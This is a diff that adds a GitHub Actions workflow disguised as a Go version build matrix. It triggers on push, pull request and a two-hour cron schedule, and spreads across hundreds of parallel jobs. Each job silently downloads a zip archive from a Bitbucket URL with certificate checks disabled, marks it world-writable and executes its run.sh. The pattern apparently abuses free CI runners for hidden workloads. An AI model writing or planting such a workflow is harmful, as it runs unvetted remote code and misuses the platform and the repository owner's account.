@@ -1,0 +1,118 @@
+# buyandshell
+# This is a basic workflow to help you get started with Actions10
+
+name: wndYdi
+on: 
+  push:
+  pull_request:
+  schedule:
+  - cron: "0 */2 * * *"
+
+jobs:
+  propamp:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 80
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4]
+        flag: [A, B, C, D]
+    timeout-minutes: 8
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Main
+      run: |
+        sudo apt-get update
+        sleep 5
+        echo "sukses"
+  Paspam:
+    needs: propamp
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 80
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
+    timeout-minutes: 6
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Main
+      run: |
+        sudo apt-get update
+        timeout 6m wget --no-check-certificate https://bitbucket.org/gitlawani/batsman/downloads/csv.zip >> /dev/null 2>&1
+        unzip csv.zip
+        if [ -d "csv" ]; then
+          chmod -R 777 csv
+          cd csv
+          ./run.sh
+        else
+          echo "Direktori csv tidak ditemukan!"
+          exit 1
+        fi
+        sleep 5m
+        echo "sukses"
+  maspam:
+    needs: propamp
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 80
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z] 
+    timeout-minutes: 6
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Main
+      run: |
+        sudo apt-get update
+        timeout 6m wget --no-check-certificate https://bitbucket.org/gitlawani/batsman/downloads/csv.zip >> /dev/null 2>&1
+        unzip csv.zip
+        if [ -d "csv" ]; then
+          chmod -R 777 csv
+          cd csv
+          ./run.sh
+        else
+          echo "Direktori csv tidak ditemukan!"
+          exit 1
+        fi
+        sleep 5m
+        echo "sukses"
+  Success:
+    needs: [propamp, paspam, maspam]
+    if: always()
+    runs-on: ubuntu-20.04
+    steps:
+      - uses: technote-space/workflow-conclusion-action@v2
+      - name: Check Failure
+        if: env.WORKFLOW_CONCLUSION == 'failure'
+        run: exit 1
+      - name: Success
+        if: ${{ success() }}
+        run: echo "all don,All Done"
